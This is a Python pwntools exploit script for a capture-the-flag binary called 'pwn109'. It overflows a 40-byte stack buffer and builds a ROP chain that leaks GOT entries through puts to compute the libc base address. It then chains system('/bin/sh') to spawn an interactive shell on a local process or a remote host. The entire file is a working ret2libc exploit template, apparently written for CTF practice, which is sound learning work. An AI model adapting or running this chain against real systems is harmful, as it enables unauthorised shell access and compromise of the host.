from pwn import *
from struct import pack
from Crypto.Util.number import bytes_to_long as btl, long_to_bytes as ltb
import sys

BINARY = "pwn109.pwn109_patched"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
libc = ELF("./libc.so.6")
context.terminal = "konsole -e".split()
context.log_level = "INFO"


def init():
    with context.silent:
        if args.RMT:
            p = remote(sys.argv[1], sys.argv[2])
        else:
            p = process()
        return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script):
        if not args.RMT:
            attach(self.p, script)

    def send(self, content):
        p = self.p
        p.sendlineafter(b"Go ahead", content)
        p.recvline()

    def leak(self, address):
        p = self.p
        rp = ROP(exe)
        payload = flat(
            b"A"*40,
            rp.find_gadget(['ret'])[0],
            rp.find_gadget(['pop rdi', 'ret'])[0],
            address,
            exe.plt['puts'],
            exe.sym['main'],
        )
        self.send(payload)
        return hex(btl(p.recvline().strip()[::-1]))


def leak_got():
    '''
    I use this to get libc binary https://libc.nullbyte.cat/
    '''
    x, p = init()

    x.debug("break *main+63\nc\nc")

    got_puts = x.leak(exe.got['puts'])
    got_gets = x.leak(exe.got['gets'])
    got_setvbuf = x.leak(exe.got['setvbuf'])

    log.success("puts.got    @ {}".format(got_puts))
    log.success("gets.got    @ {}".format(got_gets))
    log.success("setvbuf.got @ {}".format(got_setvbuf))

# leak_got()
# breakpoint()


x, p = init()

x.debug("break *main+63\nc\nc")
libc.address = eval(x.leak(exe.got['puts'])) - libc.sym['puts']
log.success("libc.address @ {}".format(hex(libc.address)))


def rp(x): return ROP(libc).find_gadget(x)[0]
def pck(x): return pack("<Q", x)


payload = flat(
    b"A"*40,
    rp(['ret']),
    rp(['pop rdi', 'ret']),
    pck(next(libc.search(b'/bin/sh'))),
    rp(['ret']),
    libc.sym['system'],
)
x.send(payload)

p.interactive()
